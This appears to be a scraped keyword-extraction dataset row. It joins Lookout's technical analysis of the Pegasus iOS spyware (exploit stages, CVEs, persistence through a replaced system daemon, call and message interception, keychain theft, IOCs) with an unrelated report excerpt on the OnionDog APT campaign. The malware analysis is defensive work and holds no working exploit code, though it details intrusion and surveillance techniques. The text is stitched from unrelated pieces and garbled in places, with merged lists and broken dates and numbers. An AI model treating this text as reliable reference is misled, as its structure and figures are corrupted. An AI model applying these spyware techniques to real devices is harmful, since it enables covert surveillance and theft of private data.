accounts owned by the target, such as banking, email, and other services he/she may use on or off the device.The attack is comprised of three separate stages that contain both the exploit code and the espionage software. The stages are sequential; each stage is required to successfully decode, exploit, install, and run the subsequent stage. Each stage leverages one of the Trident vulnerabilities in order to run successfully.STAGE 1 Delivery and WebKit vulnerability: This stage comes down over the initial URL in the form of an HTML file (1411194s) that exploits a vulnerability (CVE-2016-4655) in WebKit (used in Safari and other browsers).STAGE 2 Jailbreak: This stage is downloaded from the first stage code based on the device type (32-bit vs 64- bit). Stage 2 is downloaded as an obfuscated and encrypted package. Each package is encrypted with unique keys at each download, making traditional network-based controls ineffective. It contains the code that is needed to exploit the iOS Kernel (CVE-2016-4656 and CVE-2016-4657) and a loader that downloads and decrypts a package for stage 3.STAGE 3 Espionage software: This stage is downloaded by stage 2 and is also based on the device type (32-bit vs 64-bit). Stage 3 contains the espionage software, daemons, and other processes that are used after the de- vice has been jailbroken in stage 2. Stage 3 installs the hooks into the applications the attacker wishes to spy on. Additionally, stage 3 detects if the device was previously jailbroken through another method and, if so, removes any access to the device that the jailbreak provides, such as via SSH. The software also contains a failsafe to remove itself if certain conditions are present.The third stage deploys a number of files deployed in a standard unix tarball (test222.tar), each of which has its own pur- pose (that we describe later in this report):• ••ca.crt - root TLS certificate that is added to keystore (see Appendix A) ccom.apple.itunesstored.2.csstore - Standalone javascript that is run from the command line at reboot and is used to run unsigned code and jailbreak the kernel on device reboot converter - injects dylib in a process by pid. It is a renamed version of the cynject from the Cydia open-source library libaudio.dylib - The base library for call recording libdata.dylib - A renamed version of the Cydia substrate open-source library libimo.dylib - Generic chat sniffer library libvbcalls.dylib - Viber sniffer libwacalls.dylib - Whatsapp sniffer lw-install - Spawns all sniffing services systemd - Sends reports and files to server• • workerd - SIP moduleThe attack we investigated works on iOS up to 9.3.4. The developers maintain a large table in their code that attacks all iOS versions from 7.0 up to and including iOS 9.3.3. While the code we investigated did not contain the appropriate values to initially work on iOS 9.3.4, the exploits we investigated would still work, and it is trivial for the attackers to update the table so that the attack will work on 9.3.4.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 8One other unique property of this attack is that standard jailbreak detections fail to report that the device has been ex- ploited. The attack and installation of the spying software is designed to be as silent as possible to the target.Professional Grade Development Pegasus is well designed in terms of its modularity and efficiency. For example, the kernel exploits call upon magic tables for each of the platforms that map out kernel memory for each version and phone model. The mapping for iOS 9.2.1 on the iPhone 6 is shown here:TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 9Note that each function location in memory (as an offset from the base of the kernel) is mapped. Each of these will be used later in the kernel version.Additionally, the code is extremely modular, relative to other malware our researchers have encountered. We found com- mon libraries and common formats with similar naming conventions. For example, the libwacalls (WhatsApp Call Library) and libvbcalls (Viber Call Library) use similar formats with similar function names and common standards. Unlike most malware authors, the code in Pegasus is clean and efficient, with evidence of professional and careful design.Finally, we see evidence of a robust quality assurance process for their development: even their first stage exploit con- tains both debugging and QA-specific functions of the type one would expect from an enterprise-class software develop- ment organization.Evolution of Software The malware has been in operation for well over a year, which has enabled it to develop a degree of software maturity, and as a result it is capable of exploiting multiple iOS versions. An excerpt from the magic table that maps addresses in the kernel shows that the exploit supports versions of the phone from the iPhone 4s up to the iPhone 6s Plus.The kernel exploit includes checks that indicate that the exploit works against iOS 7 (which was released in 013):TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 10The Trident VulnerabilitiesThe software contains multiple zero-day vulnerabilities, referred to here as Trident, used against iOS 9.3.3, each of which would have worked against current 9.3.4 as of the date of discovery. With the 9.3.5 patches, these vulnerabilities will no longer work.CVE-2016-4655: Memory Corruption in Safari Webkit A memory corruption vulnerability exists in Safari Webkit that allows an attacker to execute arbitrary code. Pegasus ex- ploits this vulnerability to obtain initial code execution privileges within the context of the Safari web browser.This vulnerability is complex and Lookout continues to work on analyzing this vulnerability and will publish additional findings as they become available.CVE-2016-4656: Kernel Information Leak Circumvents KASLR Before Pegasus can execute its jailbreak, it must determine where the kernel is located in memory. Kernel Address Space Layout Randomization (KASLR) makes this task difficult by mapping the kernel into different and unpredictable locations in memory. In short, before attacking the kernel, Pegasus has to find it.The attacker has found a way to locate the kernel by using a function call that leaks a non-obfuscated kernel memory address in the return value, allowing the kernel’s actual memory location to be mapped.CVE-2016-4657: Memory Corruption in Kernel leads to Jailbreak The third vulnerability in Pegasus’ Trident is the one that is used to jailbreak the phone. A memory corruption vulnerability in the the kernel is used to corrupt memory in both the 32- and 64-bit versions. The exploits are performed differently on each version.This vulnerability is complex and Lookout continues to work on analyzing this vulnerability and will publish additional findings as they become available.Jailbreak Persistence Once the kernel has been exploited, both exploits perform similar tasks to prepare the system to be jailbroken: • Disable kernel security protections including code signing • • Clear the Safari caches (to help cover their tracks) • Write the jailbreak files (including the main loader as /sbin/mount_nfs)Remount the system partitionTo gain persistence, Pegasus replaces the system daemon rtbuddyd with a copy of the jsc binary and creates a link to a script that is similar to the exploit for CVE-2016-4655, which we will describe later.As a final step, the exploit removes /etc/nfs.conf which triggers the file to load /sbin/mount_nfs (which is the stage 3 jail- break loader). Because /sbin/mount_nfs is run as root, the code is run with full privileges.Spyware AnalysisPegasus is one of the most sophisticated pieces of surveillance and espionage software that Lookout has investigated. It has a novel mechanism to install and hide itself and obtain persistence on the system. Once it is resident, it uses a num- ber of ways to hide its communications and protect itself from discovery, and it hooks into a large number of the phone’s functions in order to gather data and intercept messages and calls.Installation and Persistence The spyware is installed during the stage 3 execution by running the lw-install binary. Lw-install sets up a few of the key structures of the product, as well as establishes persistence across reboots (and has a few protective functions to ensure that the software doesn’t accidentally brick the phone).The first thing that lw-install does is check the iOS version; it runs different commands depending on whether it is running on iOS 9 or a previous version.If it is installed on iOS 9, lw-install runs “/sbin/launchctl load” on .plist files dropped into /Library/LaunchDaemons (which is normally empty or used to hold launchd plists for jailbroken services, such as sshd). This will ensure that these files get launched and started on reboot.If the OS is not iOS 9, the first thing that lw-install does is remove the following files:Then it startsNote that lw_install appears to log to /private/var/wireless/Library/com.apple.wifid.r.logTECHNICAL ANALYSIS OF PEGASUS SPYWARE | 12Persistence: JSC Privilege Escalation Pegasus implements its persistence mechanism through the use of a developer tool called “jsc” that is part of the iOS environment. Jsc is intended to allow users to execute javascript using the webkit engine outside the context of a web browser.6 In this case, a memory corruption issue in the tool is used by Pegasus to attain persistence.As part of the installation process for persistence, the daemon rtbuddyd is replaced by a copy of jsc (which is a signed binary and allowed to run code). On device reboot rtbuddyd will run and load --early-boot, which is a link to the com.apple.itunesstored.2.cstore file. The com.apple.itunesstored.2.csstore file is structured similarly to the exploit for CVE-2016-4655. This loads shellcode which is used to re-exploit the kernel each time that the system is rebooted and start the running daemons. The execution flow of this code is:• •Run the jsc script calling --early-boot Run the exploit that maps the kernel base Run the kernel exploit Spawn the main running daemons of Pegasus: systemd, watchdogdTECHNICAL ANALYSIS OF PEGASUS SPYWARE | 13As Citizen Lab mentioned in their report, Pegasus puts its own protection above all else. From the manual, as quoted by Citizen Lab:In general, we understand that it is more important that the source will not be exposed and the target will suspect nothing than keeping the agent alive and working.To this end, Pegasus has a large number of features that enable it to maintain its secrecy. It constantly monitors the phone for status and disables any other access to the phone by previous/other jailbreaking software. Pegasus also contains a complex self-destruct mechanism which completely removes it from the phone.Disabling Updates The Stage 3 loader ensures that the phone won’t receive auto-updates going forward:TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 14Jailbreak Detection The stage 3 loader also checks the device to see if it had been previously jailbroken:The software also checks during each startup:Device Monitoring In order to maintain its ability to run, communicate and monitor its own status, the software disables the phone’s “Deep Sleep” functionality:TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 15The software also keeps a close eye on the battery status of the current device:Additionally, the software monitors the current connection state and tracks which types of networks the phone is connect- ed to, potentially in order to determine the bandwidth and ability to send full data across the network:6 url ANALYSIS OF PEGASUS SPYWARE | 16Stealth Update to Command & Control Infrastructure The software has multiple stealth communication channels. The systemd binary that Pegasus employs appears to use SMS messaging as a communication channel. This functionality has been carefully implemented with instructions delivered via SMS masquerading as two-factor authentication messages from popular services such as Facebook, Google, and Ever- note. These instructions mirror the structure and expected content of legitimate two-factor authentication messages iden- tically. An example of an attacker-provided instruction via SMS (captured originally by Citizen Lab) can be seen below.Despite appearing as a legitimate password reset from Google, this message actually contains an instruction for Pegasus to update the command and control servers that it can communicate to. It appears Pegasus is capable of receiving five types of instructions via SMS, with the instruction ID determined based on the last number of the verification code. For example, in the message above this is 9.This functionality appears to allow Pegasus to be updated out of band if http or https was not available. In the event C2 infrastructure was taken down or unavailable, this functionality provides Pegasus with a lifeline to the actors controlling it with instructions on where to find the new C2 servers. This functionality is unprecedented in spyware and provides the ability for Pegasus to persist even when infrastructure is compromised or taken down.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 17The various message texts are below:Self Destruction The Pegasus software has a highly sensitive self-destruct mechanism to ensure that the product is not discovered. When the software appears to be threatened, it will self destruct, removing its persistence mechanism (removing the cloned rtbuddyd and exploit com.apple.itunesstored.2.csstore described above).TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 18Pegasus will also remove all of its libraries (for example, the audio recording tools):Data Gathering As Pegasus’ fundamental purpose is to spy on the owner of the phone, one of its main operations is to gather data. The data- gathering functionality of Pegasus is among the most complete and comprehensive we have seen in any spy- ware package. It gathers everything from obvious high-value data like passwords, contacts, and calendar entries to data from numerous social networks. The full list of data types gathered is long, so we will examine only how it grabs certain pieces of high- value data in order to show how the product works.The full list of apps is: SMS/iMessageViber - calls and messages Facebook - address book and messages• • Gmail - mail and attachments • WhatsApp - messages and calls As high-value PII, the “systemd” process grabs each VCAL file from the calendar and sends it through a message:TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 19Contacts The software also gathers contacts from the system, dumping the victim’s entire address book.GPS location Pegasus also constantly updates and sends the location of the phone:TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 20Capturing User Passwords One of the most significant sets of private data on a phone is stored in the various user keychains. Apple’s KeyChain holds all of a user’s stored authentication info (usernames and passwords). Pegasus’ “systemd” process loads the keychain and dumps all of the victim’s data.WiFi and Router Passwords In addition to stealing all of the victim’s passwords, Pegasus interrogates the list of every Wi-Fi network that the phone has saved and grabs all of the SSIDs and WEP/WAP keys and users.Pegasus also grabs the router password for Apple devices like Airport, Time Capsule, etc.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 22Interception of Calls and Messages Pegasus has a sophisticated set of audio and messaging intercept libraries that are modular and extensible. The base libraries for audio (libaudio.dylib) and messaging (libimo.dylib) are comprehensive, but there are specialized libraries for each of the key intercept protocols.The libaudio library registers a number of notification observers that record audio when fired. These observers listen for notification IDs that get posted by various Pegasus modules. In the analyzed sample, this included notifications from the WhatsApp and Viber modules (, libwacalls.dylib and libvbcalls.dylib).Normal PhonePegasus Infected PhoneTECHNICAL ANALYSIS OF PEGASUS SPYWARE | 23The libaudio library registers a number of notification observers that record audio when fired. These observers listen for notification IDs that get posted by various Pegasus modules. In the analyzed sample, this included notifications from the WhatsApp and Viber modules (, libwacalls.dylib and libvbcalls.dylib).Process Injection: converter The interception of real-time calls from the chat messengers (e.g., WhatsApp, Viber) comes through a library that is inject- ed into their process space dynamically at run time. The “converter” binary (the mechanism through which this occurs) is a version of the cynject open-source library available here: url library takes a pid as an argument and injects a dylib into running process using Mach kernel APIs. The usage for converter is: start (usage: %s <pid> <dylib> [args ])Converter has the following entitlements: <key>com.apple.springboard.debugapplications</key> <true/> <key>get-task-allow</key> <true/> <key>task_for_pid-allow</key> <true/>Additionally, converter has a failsafe key combination that it listens for on the keyboard to dynamically unload the injected libraries.Skype Pegasus pulls all of the data about calls out of the Skype database on the device.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 24Pegasus also saves any calls that Skype has previously recorded by reading them out of the Skype database files.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 25TelegramWhatsApp The Pegasus authors have instrumented the interception of WhatsApp messages and calls within the samples that we have ob- tained. In addition to logging the appropriate information for messages and calls, the software also loads a library (libwacalls. dylib) that is designed to hook key WhatsApp functions and intercept various communication types.This library issues system-wide notifications when calls are connected, interrupted, or ended, and when another call event occurs. Any application can receive these events provided they know the ID of the notification. Throughout Pegasus these notifications are unique and conspicuous, and they are made up of a sequence that’s 56 characters long and appears to be the output of a sha224 hash function. Another Pegasus module responsible for recording audio included notification observers that explicitly listen for these IDs. It seems that when these notifications are sent from libwacalls, and consequently handled by libaudio.dylib, Pegasus records the current WhatsApp call a victim is making. Libaudio saves audio recordings from WhatsApp calls in the following directories:• micFileName - /private/var/tmp/cr/x.<call_id>.caf • spkFileName - /private/var/tmp/cr/t.<call_id>.caf sentryFileName - /private/var/tmp/cr/z.<call_id>.caf •TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 26TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 27libwacalls first checks that Cydia Mobile substrate exists by attempting to load and link /usr/lib/libdata.dylib. If it isn’t present then libwacalls exits. Otherwise execution continues, resulting in the decryption of several strings that are used to identify class- es and methods to be hooked.Libwacalls is responsible for hooking the following methods that belong to the CallManager class:• setCallConnected • endCallThe following method is also hooked that belongs to the CallLogger class:• addCallEventAll hooks rely on distributed notifications for IPC. As a result all hooks post a system-wide notification, with each notification containing a unique identifier that notification observers must reference exactly in order to receive. In all cases notification IDs are 56 characters, likely a sha224 hash digest. The functionality of these hooks is as follows:Hook methodInformation included in NotificationNotification IDsTECHNICAL ANALYSIS OF PEGASUS SPYWARE | 28Viber The samples of Pegasus we obtained were configured to obtain all of the calls from Viber through the libvbcalls library, which provides hooks for Viber. These hooks are implemented similar to the ways seen in the libwacalls dynamic library, where hook- ing of key WhatsApp functions occur. Hooking in libvbcalls takes place when calls are first started and when they finish.CallEnded hooking logs the time the call finished and posts it in a system wide notification.The following notification IDs are posted by libvbcalls:• except for the sentryFileName. All three paths are listed below.• micFileName - /private/var/tmp/cr/x.<call_id>.caf spkFileName - /private/var/tmp/cr/t.<call_id>.caf sentryFileName - /private/var/tmp/cr/vb.<call_id>.cafReal-Time Espionage In addition to the ability to grab all the input and output of the phone, the phone can be used as an audio and video recorder. As Omri Lavie, NSO’s co-founder, told the Financial Times, “Your smartphone today is the new walkie-talkie.”7 These functions are on display below:7 url ANALYSIS OF PEGASUS SPYWARE | 29TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 30ConclusionWe rely on mobile devices to both store our digital assets and give us access to them. Our phones are always with us and have become a main form of voice, video- and messaging-based communication. This makes our mobile devices highly valuable targets for motivated attackers.NSO Group reportedly has hundreds of employees and makes millions of dollars in annual revenue, effectively as a cyber arms dealer, from the sale of its sophisticated mobile attack software. NSO is only one example of this type of cyber mercenary: we know that it is not the only one, as we’ve seen with the Hacking Team, Finfisher, and other organizations that compete in this space.While this report is focused on the iOS version of the software, Lookout and Citizen Lab are aware that NSO Group advertises Android and Blackberry versions and are investigating those as well.This report shows the importance of keeping our devices up to date with the latest patches and exercising vigilance with the security of our mobile devices.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 31Appendix A: TLS Certificate Information File: ca.crtCertificate:Data:Version: 1 (0x0) Serial Number: a9:c2:dc:41:57:dc:50:14 Signature Algorithm: sha256WithRSAEncryption Issuer: CN=Asterisk Private CA, O=My Super Company Validity Not Before: Jul 18 11:21:53 2016 GMT Not After : Jul 17 11:21:53 2021 GMT Subject: CN=Asterisk Private CA, O=My Super Company Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public Key: (4096 bit) Modulus (4096 bit): 00:b0:8e:1b:24:7e:b4:d6:10:ab:10:fd:ce:a1:eb: 2d:d7:c8:38:d3:ce:bb:a3:9a:30:0e:72:08:46:01: 2d:c5:3e:3e:82:c1:4a:4e:a7:44:d8:94:2b:30:0c: dd:c3:b3:6b:bf:69:d2:0d:01:6c:e1:c5:db:f0:7c: 50:3b:ba:cc:47:64:63:67:bf:50:62:49:33:74:d1: c4:57:e8:57:2b:6c:4b:b5:63:81:66:7b:cf:0e:c2: 92:80:f9:ce:d9:e9:f5:f2:95:18:77:d7:24:47:62: ff:2d:bc:09:fa:f4:4d:92:53:df:85:cc:38:39:9f:14:ef:16:f1:6d:63:47:c9:44:1e:6a:0a:70:00:bd: 92:a5:c2:ec:d1:8d:02:bf:ae:cb:8b:5e:03:8a:67: d0:ee:02:80:b7:a7:94:9f:b5:0f:dc:3a:d6:ea:ec: 3d:8d:3e:ae:e9:54:f1:39:a4:fc:53:01:ad:ce:6a: e6:56:53:fe:7d:92:0f:5c:0b:0a:03:18:94:aa:4e: fc:8d:f0:69:ee:a2:c1:a9:0c:6d:1e:69:78:28:73: 69:e4:aa:ca:b0:0f:49:d9:ca:b2:71:72:d9:25:ec: 3e:6c:c0:10:68:aa:a3:b6:71:fd:69:f3:d0:4e:c2: 24:3f:69:1f:5a:5d:5e:02:8f:67:e7:40:52:1f:34: 17:7a:47:c8:6e:d1:fc:d2:99:6a:97:c5:1b:c1:87: 2a:4f:04:f7:7a:33:dc:3a:d0:be:5e:67:26:b7:d1: 4e:0e:fa:d4:78:44:ef:e1:a2:a5:fa:f3:ae:e4:9b: 5f:34:a5:9b:45:b0:dc:ca:a0:19:94:6f:c3:c1:0a: 79:84:35:a3:ad:2d:33:82:28:8a:e2:97:f1:82:2c: 49:80:ef:ae:10:d4:cf:83:ed:b3:0c:58:e8:1c:74: 7d:12:30:e6:bc:fb:08:b7:04:44:51:5e:95:4d:17: d3:e7:8e:ab:93:88:7f:7f:91:01:c9:d4:61:15:8b: 6f:23:41:49:58:e4:bd:81:d9:90:07:8a:c0:99:da: 2f:f0:21:f1:96:52:7e:a5:5e:69:3d:1a:da:b0:19: 24:7e:d6:5a:98:b6:4a:18:54:1f:b9:e5:ed:63:d5: e6:6d:1c:67:59:91:52:14:55:aa:94:86:b1:77:43:fe:b4:5c:d6:8b:57:e1:cf:de:84:37:4f:7a:26:0b: 92:ec:c1:3c:9c:45:31:b9:b6:ad:ef:4e:51:73:53: 96:06:16:9d:e8:67:d1:8e:08:aa:1a:93:0f:7e:fc: 8a:f0:9d:ed:13:db:dd:ab:78:5e:32:99:ac:41:b6: 09:75:a8:9c:ff:6e:72:95:44:e8:dc:38:30:e3:21: 81:0b:bfExponent: 65537 (0x10001)Signature Algorithm: sha256WithRSAEncryption 7e:ce:86:7c:1d:d7:10:b6:67:11:a0:1a:be:01:34:b8:12:f5: 61:2a:af:a6:30:94:dd:35:6f:fb:80:aa:4d:a1:80:9b:80:63: d7:02:71:8d:07:4f:57:94:03:bd:1c:b8:44:83:08:6b:be:72: 47:e4:bc:d7:51:ce:ee:3f:30:84:d9:eb:41:3d:7f:9c:6b:37: 58:d2:94:71:be:38:dc:97:fb:0e:60:2b:d1:88:e4:72:74:6f: 85:3a:60:84:f1:58:40:2c:9d:5e:f7:a9:4b:3e:aa:6a:ed:08: d8:4c:d1:33:1f:5d:ff:b9:6e:98:9f:71:6b:19:50:6d:c3:58: dd:15:76:e3:d9:80:df:da:c3:55:11:f6:cb:6a:08:64:c1:8d: f9:f6:d3:c3:30:61:bd:55:4f:34:88:96:0c:ea:96:6a:37:14: b0:f2:8f:5e:16:fa:ca:9a:28:7c:68:e1:6f:07:f3:a1:7d:a4: a4:40:5c:c6:e9:ce:98:a2:95:b2:09:93:ba:b5:a3:62:38:7d: d3:9f:1d:36:2d:29:4a:c6:96:a8:d1:2d:de:a9:2a:8b:43:33: d5:f1:a5:71:10:32:33:a0:fa:8b:4e:04:d4:12:4f:26:1f:d8: 82:27:cc:c2:a9:17:a7:65:3d:3c:45:42:77:5a:c0:10:6e:57: d2:84:89:45:bc:49:5f:be:0d:cc:ec:21:6c:06:16:f1:43:8f: 58:ce:93:68:7e:46:ea:fd:db:e0:9b:42:44:52:66:f8:01:d7: 29:7a:61:b6:be:13:94:48:02:bc:68:34:46:73:91:64:76:95: 14:08:ba:9e:41:59:76:83:ab:88:c3:60:74:75:37:34:08:24: 91:2f:ba:81:65:d3:b8:a8:b4:28:79:71:ad:7c:95:db:7e:9c: 6b:30:44:3a:b6:b1:66:83:ab:1c:a5:77:f7:63:d1:da:30:a0: 2e:65:d4:0c:c4:ec:8d:d3:4c:32:e8:71:e5:25:2b:81:97:cc: ad:c9:f2:d9:7d:01:48:10:7c:86:51:db:39:da:f3:64:0a:1d: b2:35:d8:21:2e:27:7c:c7:b3:8f:28:14:95:90:5c:17:1f:7b: 7c:a2:e8:18:4a:31:39:89:dc:8b:56:99:df:d0:26:0a:85:70: e8:e1:d0:ad:59:92:35:98:a5:7d:4f:51:46:2a:3a:cf:85:79: 5d:07:63:44:6c:a4:81:82:d8:d5:40:32:95:ac:d8:77:c3:af: 8b:fc:ad:2b:ef:04:87:80:0c:dd:c0:ec:87:2d:1f:06:51:8f: da:71:1b:f6:c4:17:5a:6f:e6:f2:b2:d4:90:b9:76:a7:e8:71: 56:30:33:4f:58:15:b6:2bAppendix B: IOCs for Jailbreak Detection Indicators of Compromise for the jailbreaks used in Pegasus/--early-boot /var/root/test.app /private/var/tmp/crw /private/var/tmp/cr /private/var/tmp/st_dataAuthorsMax Bazaliy, Lookout Michael Flossman, Lookout Andrew Blaich, LookoutSeth Hardy, Lookout Kristy Edwards, Lookout Mike Murray, LookoutAdditional credit goes to the other researchers who have worked on this analysis:From Lookout: Christina Olson, Christoph Hebeisen, Pat Ford, Colin Streicher, Robert Nickle, John RoarkFrom Citizen Lab: Bill Marczak, John Scott RailtonWebsite: www.lookout.com Blog: blog.lookout.com Twitter: @lookoutAbout Lookout: Lookout is a cybersecurity company that makes it possible for individuals and enterprises to be both mobile and secure. With 100 million mobile sensors fueling a dataset of virtually all the mobile code in the world, the Lookout Security Cloud can identify connections that would otherwise go unseen - predicting and stopping mobile attacks before they do harm. The world’s leading mobile network operators, including AT&T, Deutsche Telekom, EE, KDDI, Orange, Sprint, T-Mobile and Telstra, have selected Lookout as its preferred mobile security solution. Lookout is also partnered with such enterprise leaders as AirWatch, Ingram Micro and MobileIron. Headquartered in San Francisco, Lookout has offices in Amsterdam, Boston, London, Sydney, Tokyo, Toronto and Washington, D.C.TECHNICAL ANALYSIS OF PEGASUS SPYWARE | 35 ","{'phrases': ['the attack', 'the target', 'the user', 'the link', 'an exploit', 'ed', 'Trident', 'stage', 'WebKit', 'initial code execution', 'Kernel', '56', 'exploits', 'CVE-2016-4657', 'the device', 'the jailbreak', 'the Pegasus spyware', 'the spyware', 'data', 'messages', 'contacts', 'passwords', 'Audio', 'video', 'Calls', 'texts', 'real-time', 'encryption', 'obfuscation', 'detection', 'Ru'], 'target': 'the attack; the target; the user; the link; an exploit; ed; Trident; stage; WebKit; initial code execution; Kernel; 56; exploits; CVE-2016-4657; the device; the jailbreak; the Pegasus spyware; the spyware; data; messages; contacts; passwords; Audio; video; Calls; texts; real-time; encryption; obfuscation; detection; Ru.'}"
spearfishing emails; targets; HWP; documents; the victim; the malware; persistence; the dropper; the OnionDog backdoor; the system; the backdoor; key; keylogging; operations; the command; control; the compromised system; arbitrary commands; files; data; the attackers; the compromised system.,[' 1. Spearphishing emails sent with HWP document exploits 2. Documents exploit vulnerability to install OnionDog malware 3. Malware retrieves other malware like USB worms from C2 servers 4. USB worms infect connected devices and send data to C2 5. Backdoors allow persistent access to compromised systems 6. Data exfiltrated from targeted organizations over encrypted C2 channels '],"Extract the keywords: ContentsChapter 1 INTRODUCTION 2Main Discovery 2Chapter 2 Persistent Cyber-espionage 31.Initial attacks 3Lure documents 32. Attack procedures 9Dropper 10USB Worms 11ICEFOG Backdoor 143. Persistent monitoring & concentrated attacks 14Chapter 3 Vulnerability Analysis 171.Introduction 172.Exploit mechanism 18Chapter 4 Command and Control Mechanisms 241. Onion.City 252.Fixed IP 25Chapter 5 ICEFOG “Rebirth”：aimed at misleading or false flagging? 271.Inertial thinking in relevance analysis 272.Truth behind the “smoke curtain” 29Chapter 6 Special clues 321. PDB path 322.File property of lure documents 333.Information in Korean 33Chapter 7 Conclusion 36Chapter 1 INTRODUCTIONMain DiscoveryOn February 25th, 2016, the Lazarus Group and its APT attacks were analyzed and released to the public by the industry alliance led by Novetta1 which is composed of Kaspersky Labs2, Alien Vault Labs3and other security companies. Coincidentally, the Group is also the organization behind DarkSeoul Operation4 targeting Korean financial institutions and media houses in 2013 and the cyber-attack targeting Sony Pictures Entertainment (SPE)5 in 2014. This group mainly targetssome Asian countries like Korea and the victim industries include government, entertainment &media houses, army, aeronautical & astronautical institutes, financial entities and instructionindustries, etc.In the year of 2015, we also detected an APT organization targeting government entities,transportation companies and energy industries. Through our further investigations, it hasn’tbeen found to be connected with the Lazars Group for the time being. Due to the fact that the Trojans dropped by this organization uses Onion.City6 as their C&C and that their malwaredocument names all contain dog.jpg, this organization’s APT attacks which stretched from 2013to 2015 is code-named as Operation OnionDog. The initial malicious code dated back in May,2011, followed by at least three concentrated attacks which happened in 2013, July-August in2014 and July - September in 2015, respectively. Afterwards, we identified 96 pieces of malwarealong with 14 C&C domains and IP addresses.1Operation Blockbuster, url Blockbuster revealed, url BlockBuster unveils the actors behind the Sony attacks, url ny-attacks42013 South Korea cyberattack, url malware of OnionDog spread itself by taking full advantage of the vulnerability in Hangul -popular office software in Korean speaking countries; in the meanwhile, it infected targetsthrough USB Worms inside an isolated network. What also caught our attention is that membersof this organization communicated via Onion.City so that they could visit domains in the DeepWeb without the help of Tor browser. This has created an ideal invisible cloak for the hackers inthe anonymous environment of Tor. In addition, our in-depth analysis prevails that this threatactor tried to fly false flags or mislead investigators by adopting the techniques and resources ofother APT organizations that are already revealed to the world.Chapter 2 Persistent Cyber-espionage1. Initial attacksSeeing from the current data we collected, malicious program spread itself mainly by eithertaking advantage of the vulnerability of HWP documents or pretending to be HWP documents.Attacks in this kind of guise usually are carried out via spearfishing emails.Hangul is prevalent local office software in South Korea with the file format of HWP (Hangul of the backdoor, please see the published research from Kaspersky Lab8.3. Persistent monitoring & concentrated attacksPicture 10 Attack timelineExcept for the backdoor, if other malicious Trojans want to execute all the functionalities, theywill need to check whether the time on the host computer is within the effective time of theattack. Judging from the time slot between malware compile dates and ending dates, weconcluded that the average survival time of the OnionDog Trojans should be 15 days. Picture 108 The Icefog APT: A Tale of Cloak and Three Daggers,url the attack timeline over the past few years. From 2013, the OnionDog gang carried outattacks on yearly basis and each session lasted very short time. Curiously, the ending time of the criminal campaigns are very similar, for instance, four campaigns in 2015 ended on August 8thwith one day earlier than two campaigns in 2014.Ending date September 8th, 2015Compile date August 27th, 2015August 8th, 2015August 5th, 2015August 8th, 2015August 3rd, 2015August 8th, 2015August 8th, 2015July 13th, 2015August 9th, 2014August 9th, 2014July 31st, 2014July 23rd, 2015July 10th, 2015July 10th, 2015July 18th, 2014July 15th, 2014July 13th, 2014October 25th, 2013October 10th, 2013Survival time12351629322251815Picture 11 Codes for Ending-date checkingChapter 3 Vulnerability Analysis1. IntroductionThrough our in-depth analysis, we are sure that the vulnerability of HWP is not a zero-day one 23:39:10, May 1st, 2013The first show-up of ICEFOG sample Virustotal May 6th, 2013Publication time of the ICEFOG report by Daggers,url Truth behind the “smoke curtain”At the very beginning, we assumed the organization behind OnionDog should be ICEFOG, butfurther investigations make us begin to doubt. The active time of OnionDog malicious files isaround the month of July in 2014. Activities of other samples were active in the similar timewindows like October in 2013, July to August in 2017 and July to September in 2015. In addition,Kaspersky published its report on ICEFOG at the end of September. Usually, after being exposedby security vendors, it is time when APT organization would cease their attacks and stop usingrelevant C&C or backdoors. This time, the threat actor doesn’t follow the regular rule. Of course,the possibility still exists that the attackers was exposing themselves on purpose as long as theycan reach their goal maximally. However, it makes us begin to doubt our original assumption.According to the attack time listed above and our experience in APT analysis, there must be otherintentions to explain why the attackers used previous attack methods even though some of thebackdoors and C&C have been unveiled and detected. Regarding their real intentions, ourspeculations are:a. Lack of attack capabilities leave the attackers no choice but to use previous techniquesand resources;b. Attackers are very confident that they can reach the same goal even if they use oldtechniques and resources because they know very well about the targets;c. Their real purpose is to fly false flags on other APT organizations or to confuse andmislead security researchers.We did some tests on HWP exploit files in virtual environment and found that actually when theHWP exploit file was triggered, it firstly opened lure documents, and then ran the OnionDogsamples. In the whole process, it didn’t release any ICEFOG samples. That is to say, if users’computers are attacked by HWP exploit file, only OnionDog samples will be released and runrather than ICEFOG samples. This phenomenon aroused questions to us: why the attackersimplant a backdoor which they will never use in the following attacks to the HWP exploit?With this question in mind, we pulled out and arranged all the attacks according to chronologicalorder to have a better view of the whole cyber-attack campaign. Besides the timestamp ofICEFOG itself, Kaspersky’s reporting time and the active time of OnionDog samples, there are twotime slots that require more attention which is related to the status of C&C domainwww.sejonng.org.Picture 22 Timeline of HWP exploit and relevant resourcesIn the report of ICEFOG from Kaspersky dated to September 25th, 2013, the domainwww.sejonng.org had yet been marked as “SINKHOLED by Kaspersky Lab”. Later in the historical data of WHOIS owned by DomainTools13, we noticed the domain was already marked as “serverHold14” on January 1st, 2014. What’s more, from the website snapshot15 provided by DomainTools, it shows that the domain has already been mark as “sinkhole16” by Kaspersky on June 4th, 2014 or even earlier.Additionally, the most recent update about domain www.sejonng.org is that it has been taken over and sinkholed in the WHOIS record17 of virustracker.info.13url#016url 23 Historical page record of “www.sejonng.org” (from DomainTools)We deduced that when attackers started to distribute HWP exploit files, the C&C domain ofICEFOG backdoor has no longer belong to themselves. Combining all the factors above, we cameto the conclusion that our third assumption should be the OnionDog gang’s real purpose: to flyfalse flags on other APT organizations or mislead researchers.Similar circumstance happened in the past APT attacks in which APT organizations used fakeinformation to obstruct researcher from security companies. Taking the duqu 2.0 Analysis as anexample, researchers from Kaspersky Lab also encountered the situation where the threat actoradded some fake symbols and very rare compression algorithm to direct researchers to believethe malware was related to APT1 or MiniDuke.Picture 24 Excerpt from Kaspersky technical report about THE DUQU 